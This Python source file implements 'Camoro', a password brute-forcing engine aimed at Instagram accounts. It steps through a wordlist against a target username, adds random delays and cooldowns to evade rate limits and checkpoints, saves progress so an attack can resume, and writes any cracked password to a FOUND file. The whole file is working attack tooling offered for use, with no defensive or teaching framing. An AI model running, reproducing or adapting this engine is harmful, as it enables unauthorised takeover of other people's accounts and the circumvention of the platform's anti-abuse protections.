#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Camoro classic brute force engine with progress + resume."""

import json
import os
import random
import sys
import time
from datetime import datetime

from core.banner import (
    Colors,
    show_brute_banner,
    info,
    success,
    warn,
    error,
    ok,
    fail,
)
from core.session import IGSession


class BruteEngine:
    def __init__(
        self,
        username,
        wordlist_path,
        output_dir="output",
        delay_min=3.0,
        delay_max=5.0,
        proxy=None,
        resume=False,
    ):
        self.username = username.strip().lstrip("@")
        self.wordlist_path = wordlist_path
        self.output_dir = output_dir
        self.delay_min = delay_min
        self.delay_max = delay_max
        self.proxy = proxy
        self.resume = resume
        self.passwords = []
        self.start_index = 0
        self.tested = 0
        self.found = None
        self.session = IGSession(proxy=proxy)

        base = os.path.join(output_dir, self.username)
        os.makedirs(base, exist_ok=True)
        self.progress_file = os.path.join(base, "progress.json")
        self.result_file = os.path.join(base, "FOUND.txt")
        self.log_file = os.path.join(base, "brute_log.txt")

    def load_wordlist(self):
        if not os.path.isfile(self.wordlist_path):
            error("Wordlist not found: %s" % self.wordlist_path)
            return False
        with open(self.wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            self.passwords = [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
        if not self.passwords:
            error("Wordlist is empty")
            return False
        return True

    def _load_progress(self):
        if not self.resume or not os.path.isfile(self.progress_file):
            return
        try:
            with open(self.progress_file, "r", encoding="utf-8") as f:
                data = json.load(f)
            self.start_index = int(data.get("next_index", 0))
            self.tested = int(data.get("tested", 0))
            info("Resume enabled · continuing from index %d" % self.start_index)
        except Exception:
            warn("Could not read progress file — starting fresh")

    def _save_progress(self, index):
        data = {
            "username": self.username,
            "wordlist": self.wordlist_path,
            "next_index": index,
            "tested": self.tested,
            "total": len(self.passwords),
            "updated_at": datetime.utcnow().isoformat() + "Z",
            "found": self.found,
        }
        with open(self.progress_file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)

    def _log(self, line):
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write("%sZ | %s\n" % (datetime.utcnow().isoformat(), line))

    def _bar(self, idx, total, pwd, rate, eta):
        width = 28
        done = int(width * idx / total) if total else 0
        bar = "%s%s" % ("█" * done, "░" * (width - done))
        pct = (100.0 * idx / total) if total else 0.0
        eta_s = int(max(0, eta))
        shown = pwd if len(pwd) <= 3 else (pwd[:2] + "*" * (len(pwd) - 3) + pwd[-1])
        sys.stdout.write(
            "\r%s%s%s %s%5.1f%%%s | %d/%d | %s%-18s%s | %4.2f/s | ETA %ds   "
            % (
                Colors.OKCYAN,
                bar,
                Colors.ENDC,
                Colors.BOLD,
                pct,
                Colors.ENDC,
                idx,
                total,
                Colors.YELLOW,
                shown[:18],
                Colors.ENDC,
                rate,
                eta_s,
            )
        )
        sys.stdout.flush()

    def run(self):
        show_brute_banner()
        if not self.load_wordlist():
            return None
        self._load_progress()

        total = len(self.passwords)
        remaining = max(0, total - self.start_index)
        print("  %sTarget%s          : %s%s%s" % (Colors.BOLD, Colors.ENDC, Colors.OKGREEN, self.username, Colors.ENDC))
        print("  %sTotal passwords%s : %d" % (Colors.BOLD, Colors.ENDC, total))
        print("  %sAlready tested%s  : %d" % (Colors.BOLD, Colors.ENDC, self.start_index))
        print("  %sRemaining%s       : %d" % (Colors.BOLD, Colors.ENDC, remaining))
        print("  %sDelay%s           : %s-%ss" % (Colors.BOLD, Colors.ENDC, self.delay_min, self.delay_max))
        if self.proxy:
            print("  %sProxy%s           : %s" % (Colors.BOLD, Colors.ENDC, self.proxy))
        print()

        if not self.session.initialize():
            return None

        info("Starting attack...")
        warn("Testing passwords with %s-%ss delays to avoid rate limiting" % (self.delay_min, self.delay_max))
        print()

        t0 = time.time()
        consecutive_limits = 0
        i = self.start_index

        try:
            for i in range(self.start_index, total):
                pwd = self.passwords[i]
                result = self.session.try_login(self.username, pwd)
                self.tested += 1
                status = result.get("status")

                elapsed = max(time.time() - t0, 0.001)
                run_done = i - self.start_index + 1
                rate = run_done / elapsed
                left = total - (i + 1)
                eta = left / rate if rate > 0 else 0
                self._bar(i + 1, total, pwd, rate, eta)

                if status == "ok":
                    print()
                    self.found = pwd
                    success("PASSWORD FOUND: %s%s%s" % (Colors.BOLD, pwd, Colors.ENDC))
                    self._write_found(pwd)
                    self._save_progress(i + 1)
                    self._log("FOUND | %s" % pwd)
                    return pwd

                if status == "two_factor":
                    print()
                    success("PASSWORD ACCEPTED (2FA required): %s%s%s" % (Colors.BOLD, pwd, Colors.ENDC))
                    warn("Two-factor authentication is enabled on this account")
                    self.found = pwd
                    self._write_found(pwd, note="2FA required")
                    self._save_progress(i + 1)
                    self._log("2FA | %s" % pwd)
                    return pwd

                if status == "checkpoint":
                    print()
                    warn("Checkpoint / challenge triggered by Instagram")
                    warn("Last password tried: %s" % pwd)
                    self._save_progress(i + 1)
                    self._log("CHECKPOINT | %s" % pwd)
                    if not self.session.refresh():
                        error("Cannot refresh session after checkpoint")
                        return None
                    consecutive_limits += 1

                elif status == "rate_limit":
                    consecutive_limits += 1
                    print()
                    warn("Rate limited — cooling down (%d)" % consecutive_limits)
                    self._save_progress(i + 1)
                    cool = min(60 * consecutive_limits, 300)
                    info("Sleeping %ds ..." % cool)
                    time.sleep(cool)
                    self.session.refresh()

                elif status == "blocked":
                    print()
                    error("IP/session appears blocked by Instagram")
                    self._save_progress(i + 1)
                    self._log("BLOCKED")
                    return None

                elif status == "error":
                    consecutive_limits += 1
                    if consecutive_limits >= 5:
                        print()
                        warn("Multiple errors — refreshing session")
                        self.session.refresh()
                        consecutive_limits = 0
                else:
                    consecutive_limits = 0

                if (i + 1) % 10 == 0:
                    self._save_progress(i + 1)

                time.sleep(random.uniform(self.delay_min, self.delay_max))

        except KeyboardInterrupt:
            print()
            warn("Attack interrupted by user — progress saved")
            self._save_progress(i + 1)
            return None

        print()
        fail("Wordlist exhausted — password not found")
        self._save_progress(total)
        self._log("EXHAUSTED")
        return None

    def _write_found(self, password, note=""):
        with open(self.result_file, "w", encoding="utf-8") as f:
            f.write("CAMORO · CREDENTIAL FOUND\n")
            f.write("=" * 40 + "\n")
            f.write("Username : %s\n" % self.username)
            f.write("Password : %s\n" % password)
            if note:
                f.write("Note     : %s\n" % note)
            f.write("Time UTC : %sZ\n" % datetime.utcnow().isoformat())
        ok("Saved → %s" % self.result_file)
